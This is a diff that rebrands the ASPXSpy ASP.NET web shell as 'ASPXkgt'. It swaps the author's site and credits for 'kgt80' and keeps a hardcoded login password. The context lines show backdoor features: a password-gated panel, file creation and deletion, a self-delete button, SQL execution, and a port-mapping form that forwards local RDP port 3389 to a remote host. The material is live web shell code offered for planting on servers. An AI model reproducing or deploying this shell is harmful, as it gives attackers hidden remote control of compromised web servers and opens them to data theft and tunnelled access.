@@ -21,14 +21,12 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <script runat="server">
 /*
-Thanks Snailsor,FuYu,BloodSword,Cnqing,
 Code by Bin
-Make in China
-Blog: http://www.rootkit.net.cn
-E-mail : master@rootkit.net.cn
+Make in kgt80
+E-mail : kgt80
 */
-public string Password="tkwpcjs";//admin
-public string hrdI="ASPXSpy";
+public string Password="tkwpcjs";
+public string hrdI="ASPXkgt";
 public int OEmf=1;
 protected OleDbConnection WDmM=new OleDbConnection();
 protected OleDbCommand QQdt=new OleDbCommand();
@@ -147,7 +145,7 @@ LmtA.Visible=true;
 men.Visible=false;
 Bin_Button_CreateFile.Attributes["onClick"]="var filename=prompt('Please input the file name:','');if(filename){Bin_PostBack('Bin_Createfile',filename);}";
 Bin_Button_CreateDir.Attributes["onClick"]="var filename=prompt('Please input the directory name:','');if(filename){Bin_PostBack('Bin_Createdir',filename);}";
-Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('zkdC','');};";
+Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete ASPXkgt?')){Bin_PostBack('zkdC','');};";
 Bin_Span_Sname.InnerHtml=Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")";
 Bin_Span_FrameVersion.InnerHtml="Framework Ver : "+Environment.Version.ToString();
 //VEhV.Value=uDFn(Server.MapPath("."));
@@ -516,7 +514,7 @@ public void zkdC()
 try
 {
 File.Delete(Request.PhysicalPath);
-Response.Redirect("http://www.rootkit.net.cn");
+
 }
 catch(Exception error)
 {
@@ -2450,7 +2448,7 @@ pNH.Visible=false;
 <html xmlns="http://www.w3.org/1999/xhtml" >
 <head id="Head1" runat="server">
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
-<title>ASPXspy</title>
+<title>ASPXkgt</title>
 <style type="text/css">
 .Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
 body,td{font: 12px Arial,Tahoma;line-height: 16px;}
@@ -2483,7 +2481,7 @@ e.checked=form.chkall.checked;
 </script>
 </head>
 <body style="margin:0;table-layout:fixed;">
-<form id="ASPXSpy" runat="server">
+<form id="ASPXkgt" runat="server">
 <div id="men" runat="server" style=" margin:15px" enableviewstate="false" visible="false" >
 <span style="font:11px Verdana;">Password:</span>
 <asp:TextBox ID="Fgf" runat="server" CssClass="Bin_Style_Login" ></asp:TextBox>
@@ -2493,7 +2491,7 @@ e.checked=form.chkall.checked;
 <div id="uUD" runat="server">
 <table width="100%" border="0" cellpadding="0" cellspacing="0">
 <tr class="head">
-<td ><span style="float:right;"><a href="http://www.rootkit.net.cn" target="_blank">ASPXSpy Ver: 2008</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
+<td ><span style="float:right;">ASPXkgt Ver: 2016</span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
 </tr>
 <tr class="alt1">
 <td><span style="float:right;" id="Bin_Span_FrameVersion" runat="server"></span>
@@ -2683,7 +2681,7 @@ SQLExec : <asp:DropDownList runat="server" ID="LBu" AutoPostBack="True" OnSelect
 <td style="width:5%"></td>
 <td style="width:20%" align="left">Local Ip : <input class="input" runat="server" id="xuby" type="text" size="20" value="127.0.0.1"/></td>
 <td style="width:20%" align="left">Local Port : <input class="input" runat="server" id="Mcou" type="text" size="20" value="3389"/></td>
-<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="IPRwP" type="text" size="20" value="www.rootkit.net.cn"/></td>
+<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="IPRwP" type="text" size="20" value="kgt80"/></td>
 <td style="width:20%" align="left">Remote Port : <input class="input" runat="server" id="qICb" type="text" size="20" value="80"/></td></tr>
 <tr align="center"><td colspan="5"><br/><asp:Button ID="PiJK" CssClass="bt" runat="server" Text="MapPort" OnClick="hGw"/> <asp:Button ID="cAUZ" CssClass="bt" runat="server" Text="ClearAll" OnClick="QIS"/> <asp:Button ID="wvIGT" CssClass="bt" runat="server" Text="Refresh" OnClick="ycN"/></td></tr></table></div>
 <%--Search--%>
@@ -2717,7 +2715,7 @@ SQLExec : <asp:DropDownList runat="server" ID="LBu" AutoPostBack="True" OnSelect
 </asp:Table>
 </div>
 </td></tr></table>
-<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright(C)2006-2008 <a href="http://www.rootkit.net.cn" target="_blank">Bin'Blog</a> All Rights Reserved.</div></div>
+<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright(C)2016 kgt80 <a href="" target="_blank">Bin'Blog</a> All Rights Reserved.</div></div>
 </form>
 </body>
 </html>
